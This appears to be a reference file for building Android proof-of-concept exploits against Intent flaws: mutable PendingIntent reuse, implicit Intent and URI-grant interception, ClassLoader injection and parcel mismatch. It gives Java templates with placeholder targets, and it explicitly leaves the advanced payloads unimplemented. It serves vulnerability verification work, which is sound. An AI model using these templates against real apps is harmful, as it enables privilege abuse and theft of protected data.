---
name: poc-app-intent
description: Intent PoC reference covering mutable PendingIntent abuse, URI-grant abuse, implicit Intent hijack, ClassLoader injection, and parcel mismatch.
---

# Intent PoC Reference

Use this reference for handle reuse, grant forwarding, or serialization-driven Intent attacks. Intent PoCs usually fit `returned-handle` or `interception` shapes.

## Contents

- [Template Wiring](#template-wiring)
- [Construction Matrix](#construction-matrix)
- [Shared Inputs](#shared-inputs)
- [Pattern 1 - Returned Handle Reuse](#pattern-1---returned-handle-reuse)
- [Pattern 2 - Grant Or Implicit-Intent Interception](#pattern-2---grant-or-implicit-intent-interception)
- [Pattern 3 - Advanced Serialization Path](#pattern-3---advanced-serialization-path)
- [Pattern 4 - Advanced Parcel Mismatch](#pattern-4---advanced-parcel-mismatch)
- [Construction Notes](#construction-notes)

## Template Wiring

These snippets show the exploit body shape. In the current template:

- keep the body in a helper method or lambda
- register the exploit in `ExploitRegistry`
- if the launch is browser-driven, let `PoCActivity` and `server/public/` provide the delivery URL

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| mutable `PendingIntent` abuse | `returned-handle` | capture step if needed | victim-identity action runs |
| URI-grant abuse | `interception` or `returned-handle` | helper activity/receiver if grant must be intercepted | protected `content://` URI becomes readable or writable |
| implicit Intent hijack | `interception` | helper component in Manifest | payload or workflow is intercepted |
| ClassLoader injection | advanced `direct-trigger` | custom payload class | unsafe deserialization path accepts crafted object |
| parcel mismatch | advanced `direct-trigger` | custom parcel builder | validation path and execution path diverge |

## Shared Inputs

- returned handle, grant-bearing URI, or trigger Intent source
- exact target component, action, data URI, or payload extra key
- whether the PoC needs capture first or can trigger directly
- visible success signal

## Pattern 1 - Returned Handle Reuse

Use for mutable `PendingIntent` reuse.

```java
private static void runPendingIntentReuse(Context context) {
    PendingIntent pendingIntent = obtainTargetPendingIntent();
    if (pendingIntent == null) {
        Log.i("PoC", "Could not obtain target PendingIntent");
        return;
    }

    Intent fillIntent = new Intent();
    fillIntent.setClassName("com.target", "com.target.PrivilegedActivity");
    fillIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

    try {
        pendingIntent.send(context, 0, fillIntent);
        Log.i("PoC", "Reused mutable PendingIntent with attacker-filled target");
    } catch (Exception e) {
        Log.e("PoC", "PendingIntent send failed", e);
    }
}
```

Registration shape:

```java
static {
    register("intent-pending", "Reuse PendingIntent", () -> runPendingIntentReuse(appContext));
}
```

Common acquisition sources:

- notification action
- app widget template
- IPC return value
- provider result or activity extra

Do not invent a capture step that the verified finding never proved.

Fill with:

- real handle acquisition source
- real fill-in Intent body, flags, and target component

## Pattern 2 - Grant Or Implicit-Intent Interception

Use for implicit Intent hijack or grant capture.

```java
private static void runImplicitIntentHijack(Context context) {
    Intent trigger = new Intent("com.target.TRIGGER_ACTION");
    context.sendBroadcast(trigger);
    Log.i("PoC", "Triggered flow that should emit an implicit Intent");
}
```

Registration shape:

```java
static {
    register("intent-intercept", "Trigger Intent Interception", () -> runImplicitIntentHijack(appContext));
}
```

Manifest support:

- add a helper activity, receiver, or service with the matching `intent-filter`
- add only the exact action, data scheme, and category required to capture the target flow

Fill with:

- real trigger action
- real intercepted action, scheme, authority, or category from the verified path

Success signal:

- captured implicit payload
- captured grant-bearing `content://` URI

## Pattern 3 - Advanced Serialization Path

Use for ClassLoader-dependent deserialization.

```java
private static void runClassLoaderInjection(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.DeserializeActivity");
    Log.i("PoC", "Prepare a payload class only after confirming the exact deserialization path.");
    context.startActivity(intent);
}
```

Registration shape:

```java
static {
    register("intent-classloader", "Trigger ClassLoader Path", () -> runClassLoaderInjection(appContext));
}
```

Construction rule:

- do not mark this PoC `build-ready` if the payload class still depends on unstated assumptions

## Pattern 4 - Advanced Parcel Mismatch

Use for bundle or parcel shape mismatches.

```java
private static void runParcelMismatch(Context context) {
    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.IntentProcessingActivity");
    Bundle bundle = new Bundle();
    intent.putExtra("extra_bundle", bundle);
    context.startActivity(intent);
    Log.i("PoC", "Replace the placeholder Bundle with a real crafted parcel only after the mismatch shape is verified.");
}
```

Registration shape:

```java
static {
    register("intent-parcel", "Trigger Parcel Mismatch", () -> runParcelMismatch(appContext));
}
```

Construction rule:

- treat parcel mismatch as high-cost and exact-shape dependent
- do not overclaim compile or runtime readiness if the crafted parcel is not actually implemented

## Construction Notes

- prefer a returned-handle or interception PoC over advanced serialization if the verified finding already gives you a simpler trigger
- keep capture steps explicit: if the exploit needs a grant, implicit route, or returned object, show how that handle is obtained
- ClassLoader and parcel-shape cases stay probe-oriented until the exact payload object or parcel body is implemented
